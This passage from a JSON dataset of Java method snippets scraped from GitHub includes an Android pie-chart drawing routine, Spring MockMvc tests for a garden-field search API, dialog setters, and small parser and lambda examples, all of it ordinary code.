\u692d\u5706\u56db\u8fb9\n        float left, right, top, bottom;\n\n        // \u5706\u7684\u534a\u5f84\u53ca\u5750\u6807\n        float r = 280, oX, oY;\n\n        // \u6247\u5f62\u5f27\u7ebf\u4e2d\u70b9\u5750\u6807\n        float midX, midY;\n\n        // \u6587\u5b57\u5750\u6807\n        float txtX, txtY;\n\n        // \u6298\u7ebf\u5750\u6807\n        float line1X, line1Y, line2X, line2Y;\n\n        boolean isSelected;\n\n        int offset;\n\n        for (int i = 0; i < phoneModels.size(); i++) {\n\n            // \u9009\u62e9\u54ea\u4e2a\u624b\u673a\u54c1\u724c\n            isSelected = i == 0;\n\n            offset = isSelected ? 20 : 0;\n\n            percent = phoneModels.get(i).percent * to360;\n\n            oX = getWidth() / 2;\n            oY = (getHeight() - marginBottom)  / 2;\n\n            if (i == 0) {\n                startAngle = outset;\n            } else {\n                startAngle += phoneModels.get(i - 1).percent * to360 + 2;\n            }\n\n            midAngle = startAngle + (float) (percent / 2);\n\n            // \u5b9a\u4f4d\u5706\u5fc3\n            if (isSelected) {\n                oX += offset * Math.cos(midAngle * Math.PI / 180);\n                oY += offset * Math.sin(midAngle * Math.PI / 180);\n            } else {\n                oX = getWidth() / 2;\n                oY = (getHeight() - marginBottom) / 2;\n            }\n\n            left = oX - r;\n            right = oX + r;\n            top = oY - r;\n            bottom = oY + r;\n\n            midX = (float) (oX + Math.cos(midAngle * Math.PI / 180) * r);\n            midY = (float) (oY + Math.sin(midAngle * Math.PI / 180) * r);\n\n            line1X = (float) (oX + Math.cos(midAngle * Math.PI / 180) * (r + line1));\n            line1Y = (float) (oY + Math.sin(midAngle * Math.PI / 180) * (r + line1));\n\n            if (line1X > oX) {\n                // \u7ebf\u5728\u53f3\u4fa7\n                line2 = (int) (getWidth() - line1X - marginPhone);\n            } else {\n                // \u7ebf\u5728\u5de6\u4fa7\n                line2 = (int) (getWidth() / 2 - (getWidth() / 2 - line1X) - marginPhone);\n            }\n\n            line2X = Math.abs(midAngle) <= 90 ? line1X + line2 : line1X - line2;\n            line2Y = line1Y;\n\n            txtX = Math.abs(midAngle) <= 90 ? line2X + 20 : line2X - 20;\n            txtY = line1Y;\n\n            // \u7ed8\u5236\u6298\u7ebf\n            mPaint.setStyle(Paint.Style.STROKE);\n            mPaint.setColor(Color.BLACK);\n            mPath.moveTo(midX, midY);\n            mPath.lineTo(line1X, line1Y);\n            mPath.lineTo(line2X, line2Y);\n            canvas.drawPath(mPath, mPaint);\n\n            // \u7ed8\u5236\u624b\u673a\u5382\u5546\u540d\n            txtPaint.setStyle(Paint.Style.FILL);\n            txtPaint.setColor(Color.BLACK);\n            txtPaint.setTextSize(24);\n            if (Math.abs(midAngle) <= 90) {\n                txtPaint.setTextAlign(Paint.Align.LEFT);\n            } else {\n                txtPaint.setTextAlign(Paint.Align.RIGHT);\n            }\n            String name = phoneModels.get(i).brand + \" \" + phoneModels.get(i).percent + \" %\";\n            canvas.drawText(name, txtX, txtY, txtPaint);\n\n            // \u7ed8\u5236\u6247\u5f62\n            mPaint.setStyle(Paint.Style.FILL);\n            mPaint.setColor(getResources().getColor(phoneModels.get(i).color));\n            mRectF.set(left, top, right, bottom);\n            canvas.drawArc(mRectF, startAngle, (float) percent, true, mPaint);\n        }\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson1/Practice11PieChartView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 33545, "method_name": "setup", "class_name": "GardenFieldSearchIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        GardenFieldController gardenFieldController = new GardenFieldController(gardenFieldService, leasingService);\n\n        this.restGardenFieldMockMvc = MockMvcBuilders.standaloneSetup(gardenFieldController)\n            .setCustomArgumentResolvers(pageableArgumentResolver)\n            .setControllerAdvice(exceptionTranslator)\n            .setMessageConverters(jacksonMessageConverter)\n            .build();\n\n        User user = new User();\n        user.setLogin(DEFAULT_LOGIN);\n        user.setPassword(RandomStringUtils.random(60));\n        user.setActivated(true);\n        user.setEmail(RandomStringUtils.randomAlphabetic(5) + DEFAULT_EMAIL);\n        user.setFirstName(DEFAULT_FIRSTNAME);\n        user.setLastName(DEFAULT_LASTNAME);\n        user.setBankAccountIBAN(DEFAULT_IBAN);\n        user.setStripeAccountVerified(true);\n        User savedUser = userRepository.saveAndFlush(user);\n        simpleUserDTO = simpleUserMapper.toDTO(savedUser);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33546, "method_name": "searchGardenFieldForDescription", "class_name": "GardenFieldSearchIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchGardenFieldForDescription() throws Exception {\n        String name1 = \"garden1\";\n        String name2 = \"garden2\";\n        String name3 = \"garden3\";\n        String desc1 = \"Wenig Sonne, kleines Gartenfeld.\";\n        String desc2 = \"Netter Garten in ruhiger Umgebung\";\n        String desc3 = \"Cooler Garten mit viel Sonne\";\n\n        GardenFieldDTO gardenFieldDTO1 = createGardenFieldDTOWithoutOwner();\n        GardenFieldDTO gardenFieldDTO2 = createGardenFieldDTOWithoutOwner();\n        GardenFieldDTO gardenFieldDTO3 = createGardenFieldDTOWithoutOwner();\n\n        gardenFieldDTO1.setOwner(simpleUserDTO);\n        gardenFieldDTO1.setName(name1);\n        gardenFieldDTO1.setDescription(desc1);\n\n        gardenFieldDTO2.setOwner(simpleUserDTO);\n        gardenFieldDTO2.setName(name2);\n        gardenFieldDTO2.setDescription(desc2);\n\n        gardenFieldDTO3.setOwner(simpleUserDTO);\n        gardenFieldDTO3.setName(name3);\n        gardenFieldDTO3.setDescription(desc3);\n\n        gardenFieldService.createGardenField(gardenFieldDTO1);\n        gardenFieldService.createGardenField(gardenFieldDTO2);\n        gardenFieldService.createGardenField(gardenFieldDTO3);\n\n        restGardenFieldMockMvc.perform(get(\"/api/v1/gardenfields/filter?keywords=Sonne\")\n            .accept(MediaType.APPLICATION_JSON))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(2)))\n            .andExpect(jsonPath(\"$.content.[0].name\").value(is(\"garden1\")))\n            .andExpect(jsonPath(\"$.content.[1].name\").value(is(\"garden3\")));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33547, "method_name": "testGardenFieldFilterLocation", "class_name": "GardenFieldSearchIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGardenFieldFilterLocation() throws Exception {\n        String filterString = \"latitude=\" + LATITUDE + \"&longitude=\" + LONGITUDE + \"&radiusInKM=50\";\n        String name1 = \"gardenname1\";\n        String name2 = \"gardenname2\";\n\n        GardenFieldDTO gardenFieldDTO1 = createGardenFieldDTOWithoutOwner();\n        GardenFieldDTO gardenFieldDTO2 = createGardenFieldDTOWithoutOwner();\n        GardenFieldDTO gardenFieldDTO3 = createGardenFieldDTOWithoutOwner();\n\n        gardenFieldDTO1.setOwner(simpleUserDTO);\n        gardenFieldDTO1.setName(name1);\n        gardenFieldDTO1.setLatitude(LATITUDE);\n        gardenFieldDTO1.setLongitude(LONGITUDE);\n\n        gardenFieldDTO2.setOwner(simpleUserDTO);\n        gardenFieldDTO2.setName(name2);\n        gardenFieldDTO2.setLatitude(LATITUDE + 0.1);\n        gardenFieldDTO2.setLongitude(LONGITUDE + 0.1);\n\n        gardenFieldDTO3.setOwner(simpleUserDTO);\n        //gardenfield 3 should not be in the radius 5, as gardenfield 1 and 2 are\n        gardenFieldDTO3.setLatitude(LATITUDE + 123.23);\n        gardenFieldDTO3.setLongitude(LONGITUDE + 13.876);\n\n        gardenFieldService.createGardenField(gardenFieldDTO1);\n        gardenFieldService.createGardenField(gardenFieldDTO2);\n        gardenFieldService.createGardenField(gardenFieldDTO3);\n\n        restGardenFieldMockMvc.perform(get(\"/api/v1/gardenfields/filter?\" + filterString)\n            .accept(MediaType.APPLICATION_JSON))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(2)))\n            .andExpect(jsonPath(\"$.content.[0].name\").value(is(name1)))\n            .andExpect(jsonPath(\"$.content.[1].name\").value(is(name2)));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33548, "method_name": "testGardenFieldFilterSize", "class_name": "GardenFieldSearchIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGardenFieldFilterSize() throws Exception {\n        String filterString = \"sizeInM2LowerBound=3&sizeInM2UpperBound=9\";\n        String name1 = \"gardenfield1\";\n        String name2 = \"gardenfield2\";\n        String name3 = \"gardenfield3\";\n\n        GardenFieldDTO gardenFieldDTO1 = createGardenFieldDTOWithoutOwner();\n        gardenFieldDTO1.setName(name1);\n        gardenFieldDTO1.setSizeInM2(5.0);\n        gardenFieldDTO1.setOwner(simpleUserDTO);\n\n        GardenFieldDTO gardenFieldDTO2 = createGardenFieldDTOWithoutOwner();\n        gardenFieldDTO2.setName(name2);\n        gardenFieldDTO2.setSizeInM2(8.9);\n        gardenFieldDTO2.setOwner(simpleUserDTO);\n\n        GardenFieldDTO gardenFieldDTO3 = createGardenFieldDTOWithoutOwner();\n        gardenFieldDTO3.setName(name3);\n        gardenFieldDTO3.setSizeInM2(10.0);\n        gardenFieldDTO3.setOwner(simpleUserDTO);\n\n        gardenFieldService.createGardenField(gardenFieldDTO1);\n        gardenFieldService.createGardenField(gardenFieldDTO2);\n        gardenFieldService.createGardenField(gardenFieldDTO3);\n\n        restGardenFieldMockMvc.perform(get(\"/api/v1/gardenfields/filter?\" + filterString)\n            .accept(MediaType.APPLICATION_JSON))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.[0].name\").value(is(name1)))\n            .andExpect(jsonPath(\"$.content.[1].name\").value(is(name2)))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(2)));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33549, "method_name": "testGardenFieldFilterWithInvalidCriteriaMissingRadius_shouldReturnValidationError", "class_name": "GardenFieldSearchIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGardenFieldFilterWithInvalidCriteriaMissingRadius_shouldReturnValidationError() throws Exception {\n        String filterString = \"latitude=1.0&longitude=2.0\";\n\n        GardenFieldDTO gardenFieldDTO1 = createGardenFieldDTOWithoutOwner();\n        GardenFieldDTO gardenFieldDTO2 = createGardenFieldDTOWithoutOwner();\n        GardenFieldDTO gardenFieldDTO3 = createGardenFieldDTOWithoutOwner();\n\n        gardenFieldDTO1.setOwner(simpleUserDTO);\n        gardenFieldDTO2.setOwner(simpleUserDTO);\n        gardenFieldDTO3.setOwner(simpleUserDTO);\n\n        gardenFieldDTO1.setSizeInM2(5.0);\n        gardenFieldDTO2.setSizeInM2(10.0);\n        gardenFieldDTO3.setSizeInM2(8.9);\n\n        gardenFieldService.createGardenField(gardenFieldDTO1);\n        gardenFieldService.createGardenField(gardenFieldDTO2);\n        gardenFieldService.createGardenField(gardenFieldDTO3);\n\n        Exception exception = restGardenFieldMockMvc.perform(get(\"/api/v1/gardenfields/filter?\" + filterString)\n            .accept(MediaType.APPLICATION_JSON))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isBadRequest())\n            .andReturn().getResolvedException();\n        assertThat(Objects.requireNonNull(exception).getMessage()).contains(\"filter\").contains(\"invalid\");\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33550, "method_name": "testLeasingTimeFromTofilter", "class_name": "GardenFieldSearchIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testLeasingTimeFromTofilter() throws Exception {\n        String filterString = \"leasingTimeFrom=2021-01-01T04:00:00.000Z&leasingTimeTo=2021-04-01T04:00:00.000Z\";\n        String name1 = \"gardenname1\";\n        GardenFieldDTO gardenFieldDTO1 = createGardenFieldDTOWithoutOwner();\n        gardenFieldDTO1.setName(name1);\n        GardenFieldDTO gardenFieldDTO2 = createGardenFieldDTOWithoutOwner();\n\n        gardenFieldDTO1.setOwner(simpleUserDTO);\n        gardenFieldDTO2.setOwner(simpleUserDTO);\n\n        gardenFieldDTO1.setSizeInM2(5.0);\n        gardenFieldDTO2.setSizeInM2(10.0);\n\n        gardenFieldDTO1 = gardenFieldService.createGardenField(gardenFieldDTO1);\n        gardenFieldDTO2 = gardenFieldService.createGardenField(gardenFieldDTO2);\n\n        GardenField gardenField1 = gardenFieldRepository.findById(gardenFieldDTO1.getId()).get();\n        GardenField gardenField2 = gardenFieldRepository.findById(gardenFieldDTO2.getId()).get();\n\n        Leasing leasing1 = new Leasing()\n            .from(Instant.parse(\"2020-01-01T04:00:00.000Z\"))\n            .to(Instant.parse(\"2020-10-01T04:00:50.000Z\"))\n            .status(LeasingStatus.RESERVED)\n            .gardenField(gardenField1)\n            .paymentSessionId(DEFAULT_PAYMENT_SESSION_ID)\n            .user(userRepository.getOne(simpleUserDTO.getId()));\n        Leasing leasing2 = new Leasing()\n            .from(Instant.parse(\"2021-03-01T04:00:00.000Z\"))\n            .to(Instant.parse(\"2021-10-01T04:00:50.000Z\"))\n            .status(LeasingStatus.RESERVED)\n            .gardenField(gardenField2)\n            .paymentSessionId(DEFAULT_PAYMENT_SESSION_ID)\n            .user(userRepository.getOne(simpleUserDTO.getId()));\n        leasingRepository.save(leasing1);\n        leasingRepository.save(leasing2);\n        leasingRepository.flush();\n        gardenField1.setLeasings(Collections.singletonList(leasing1));\n        gardenField2.setLeasings(Collections.singletonList(leasing2));\n        gardenFieldRepository.save(gardenField1);\n        gardenFieldRepository.save(gardenField2);\n        gardenFieldRepository.flush();\n\n        restGardenFieldMockMvc.perform(get(\"/api/v1/gardenfields/filter?\" + filterString)\n            .accept(MediaType.APPLICATION_JSON))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(1)))\n            .andExpect(jsonPath(\"$.content.[0].name\").value(is(name1)));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33551, "method_name": "testBooleanFilters", "class_name": "GardenFieldSearchIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testBooleanFilters() throws Exception {\n        String filterString = \"water=true&electricity=true&roofed=false&high=false&glassHouse=false\";\n        GardenFieldDTO gardenFieldDTO1 = createGardenFieldDTO();\n        GardenFieldDTO gardenFieldDTO2 = createGardenFieldDTO();\n        GardenFieldDTO gardenFieldDTO3 = createGardenFieldDTO();\n\n        gardenFieldDTO1.setWater(true);\n        gardenFieldDTO1.setElectricity(true);\n        gardenFieldDTO1.setRoofed(false);\n        gardenFieldDTO1.setHigh(false);\n        gardenFieldDTO1.setGlassHouse(false);\n        gardenFieldDTO1.setName(\"gardenname1\");\n\n        gardenFieldService.createGardenField(gardenFieldDTO1);\n        gardenFieldService.createGardenField(gardenFieldDTO2);\n        gardenFieldService.createGardenField(gardenFieldDTO3);\n\n        restGardenFieldMockMvc.perform(get(\"/api/v1/gardenfields/filter?\" + filterString)\n            .accept(MediaType.APPLICATION_JSON))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(1)))\n            .andExpect(jsonPath(\"$.content.[0].name\").value(is(\"gardenname1\")));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33552, "method_name": "testGardenFieldCombinedFilter", "class_name": "GardenFieldSearchIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGardenFieldCombinedFilter() throws Exception {\n        String filterString = \"maxPrice=300.0&roofed=true&latitude=1.0&longitude=2.0&radiusInKM=5\";\n        String name1 = \"gardenname1\";\n        GardenFieldDTO gardenFieldDTO1 = createGardenFieldDTOWithoutOwner();\n        GardenFieldDTO gardenFieldDTO2 = createGardenFieldDTOWithoutOwner();\n        GardenFieldDTO gardenFieldDTO3 = createGardenFieldDTOWithoutOwner();\n\n        gardenFieldDTO1.setOwner(simpleUserDTO);\n        gardenFieldDTO1.setName(name1);\n        gardenFieldDTO2.setOwner(simpleUserDTO);\n        gardenFieldDTO3.setOwner(simpleUserDTO);\n\n        gardenFieldDTO1.setPricePerM2(1.0);\n        gardenFieldDTO1.setRoofed(true);\n        gardenFieldDTO1.setSizeInM2(10.0);\n\n        gardenFieldDTO2.setPricePerM2(1.5);\n        gardenFieldDTO2.setRoofed(false);\n        gardenFieldDTO2.setSizeInM2(10.0);\n\n        gardenFieldDTO3.setPricePerM2(2.1);\n        gardenFieldDTO3.setRoofed(true);\n        gardenFieldDTO3.setSizeInM2(10.0);\n\n        gardenFieldService.createGardenField(gardenFieldDTO1);\n        gardenFieldService.createGardenField(gardenFieldDTO2);\n        gardenFieldService.createGardenField(gardenFieldDTO3);\n\n        restGardenFieldMockMvc.perform(get(\"/api/v1/gardenfields/filter?\" + filterString)\n            .accept(MediaType.APPLICATION_JSON))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.content.length()\").value(is(1)))\n            .andExpect(jsonPath(\"$.content.[0].name\").value(is(name1)));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33553, "method_name": "createGardenFieldDTOWithoutOwner", "class_name": "GardenFieldSearchIT", "params": [], "throws": null, "modifiers": ["private"], "return_type": "GardenFieldDTO", "snippet": "    private GardenFieldDTO createGardenFieldDTOWithoutOwner() {\n        GardenFieldDTO gardenFieldDTO = new GardenFieldDTO();\n        gardenFieldDTO.setName(GARDEN_NAME);\n        gardenFieldDTO.setSizeInM2(SIZE_IN_M2);\n        gardenFieldDTO.setPricePerM2(PRICE_PER_M2);\n        gardenFieldDTO.setLatitude(LATITUDE);\n        gardenFieldDTO.setLongitude(LONGITUDE);\n        gardenFieldDTO.setCity(CITY);\n        gardenFieldDTO.setRoofed(ROOFED);\n        gardenFieldDTO.setGlassHouse(GLASS_HOUSE);\n        gardenFieldDTO.setHigh(HIGH);\n        gardenFieldDTO.setWater(WATER);\n        gardenFieldDTO.setElectricity(ELECTRICITY);\n        gardenFieldDTO.setPhValue(PH_VALUE);\n        gardenFieldDTO.setDescription(DESCRIPTION);\n        return gardenFieldDTO;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33554, "method_name": "createGardenFieldDTO", "class_name": "GardenFieldSearchIT", "params": [], "throws": null, "modifiers": ["private"], "return_type": "GardenFieldDTO", "snippet": "    private GardenFieldDTO createGardenFieldDTO() {\n        GardenFieldDTO gardenFieldDTO = createGardenFieldDTOWithoutOwner();\n        gardenFieldDTO.setOwner(simpleUserDTO);\n        return gardenFieldDTO;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/GardenFieldSearchIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33555, "method_name": "setTitle", "class_name": "ConfirmDialog", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(CharSequence title) {\n        this.tvTitle.setText(title);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/ConfirmDialog.java", "stars": "2", "class_props": {"extends": "BaseDialog", "implements": null, "modifiers": ["public"]}}, {"id": 33556, "method_name": "setTitleTextSize", "class_name": "ConfirmDialog", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitleTextSize(float dp) {\n        this.tvTitle.setTextSize(dp);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/ConfirmDialog.java", "stars": "2", "class_props": {"extends": "BaseDialog", "implements": null, "modifiers": ["public"]}}, {"id": 33557, "method_name": "setDesc", "class_name": "ConfirmDialog", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "ConfirmDialog", "snippet": "    public ConfirmDialog setDesc(CharSequence desc) {\n        if (!TextUtils.isEmpty(desc)) {\n            this.tvDesc.setVisibility(View.VISIBLE);\n            this.tvDesc.setText(desc);\n        } else {\n            this.tvDesc.setVisibility(View.GONE);\n        }\n        return this;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/ConfirmDialog.java", "stars": "2", "class_props": {"extends": "BaseDialog", "implements": null, "modifiers": ["public"]}}, {"id": 33558, "method_name": "setDescTextColor", "class_name": "ConfirmDialog", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ConfirmDialog", "snippet": "    public ConfirmDialog setDescTextColor(int color) {\n        this.tvDesc.setTextColor(color);\n        return this;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/ConfirmDialog.java", "stars": "2", "class_props": {"extends": "BaseDialog", "implements": null, "modifiers": ["public"]}}, {"id": 33559, "method_name": "setDescTextSize", "class_name": "ConfirmDialog", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDescTextSize(float dp) {\n        this.tvDesc.setTextSize(dp);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/ConfirmDialog.java", "stars": "2", "class_props": {"extends": "BaseDialog", "implements": null, "modifiers": ["public"]}}, {"id": 33560, "method_name": "setButton", "class_name": "ConfirmDialog", "params": ["CharSequence", "CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setButton(CharSequence cancelCs, CharSequence okCs) {\n        tvCancel.setText(cancelCs);\n        tvOk.setText(okCs);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/ConfirmDialog.java", "stars": "2", "class_props": {"extends": "BaseDialog", "implements": null, "modifiers": ["public"]}}, {"id": 33561, "method_name": "setButton", "class_name": "ConfirmDialog", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setButton(CharSequence okCs) {\n        tvCancel.setVisibility(View.GONE);\n        vLine.setVisibility(View.GONE);\n        vHorLine.setVisibility(View.VISIBLE);\n        tvOk.setText(okCs);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/ConfirmDialog.java", "stars": "2", "class_props": {"extends": "BaseDialog", "implements": null, "modifiers": ["public"]}}, {"id": 33562, "method_name": "setTitleGrivate", "class_name": "ConfirmDialog", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitleGrivate() {\n        tvTitle.setGravity(Gravity.LEFT);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/ConfirmDialog.java", "stars": "2", "class_props": {"extends": "BaseDialog", "implements": null, "modifiers": ["public"]}}, {"id": 33563, "method_name": "getLayout", "class_name": "ConfirmDialog", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getLayout() {\n        return R.layout.dialog_confirm;\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYLiveChat-android/master/app/src/main/java/com/mediaroom/utils/ConfirmDialog.java", "stars": "2", "class_props": {"extends": "BaseDialog", "implements": null, "modifiers": ["public"]}}, {"id": 33564, "method_name": "main", "class_name": "DevToolsTestApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tnew SpringApplicationBuilder(DevToolsTestApplication.class).listeners(new WebServerPortFileWriter(args[0]))\n\t\t\t\t.run(args);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot-devtools/src/intTest/java/com/example/DevToolsTestApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33565, "method_name": "checkString", "class_name": "Demo02Predicate_and", "params": ["String", "Predicate<String>", "Predicate<String>"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean checkString(String s, Predicate<String> pre1,Predicate<String> pre2){\n        //return pre1.test(s) && pre2.test(s);\n        return pre1.and(pre2).test(s);//\u7b49\u4ef7\u4e8ereturn pre1.test(s) && pre2.test(s);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo06/Predicate/Demo02Predicate_and.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33566, "method_name": "main", "class_name": "Demo02Predicate_and", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u5b9a\u4e49\u4e00\u4e2a\u5b57\u7b26\u4e32\n        String s = \"abcdef\";\n        //\u8c03\u7528checkString\u65b9\u6cd5,\u53c2\u6570\u4f20\u9012\u5b57\u7b26\u4e32\u548c\u4e24\u4e2aLambda\u8868\u8fbe\u5f0f\n        boolean b = checkString(s,(String str)->{\n            //\u5224\u65ad\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u662f\u5426\u5927\u4e8e5\n            return str.length()>5;\n        },(String str)->{\n            //\u5224\u65ad\u5b57\u7b26\u4e32\u4e2d\u662f\u5426\u5305\u542ba\n            return str.contains(\"a\");\n        });\n        System.out.println(b);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/23.%E3%80%90%E5%87%BD%E6%95%B0%E5%BC%8F%E6%8E%A5%E5%8F%A3%E3%80%91-%E7%AC%94%E8%AE%B0/code/12_FunctionalInterface/src/com/itheima/demo06/Predicate/Demo02Predicate_and.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33567, "method_name": "type", "class_name": "Token", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TokenType", "snippet": "    public TokenType type() {\n        return type;\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/Token.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33568, "method_name": "value", "class_name": "Token", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String value() {\n        return value;\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/Token.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33569, "method_name": "toString", "class_name": "Token", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"Token <\" + type + \", \" + value + \">\";\n    }", "url": "https://raw.githubusercontent.com/Virjid/Kartingjson/master/src/main/java/me/virjid/karting/json/parser/Token.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33570, "method_name": "traverseAndLockQueue", "class_name": "DbQueueManager", "params": ["int"], "throws": null, "modifiers": [], "return_type": "DbQueue", "snippet": "    DbQueue traverseAndLockQueue(int index){\n        LOG.info(\"Traversal queue => total [{}], index [{}], try to get the Consumer-Lock of queue\",\n                queueList.size(), index);\n        int preIndex = index;\n        while (true) {\n            DbQueue dbQueue;\n            rwLock.readLock().lock();\n        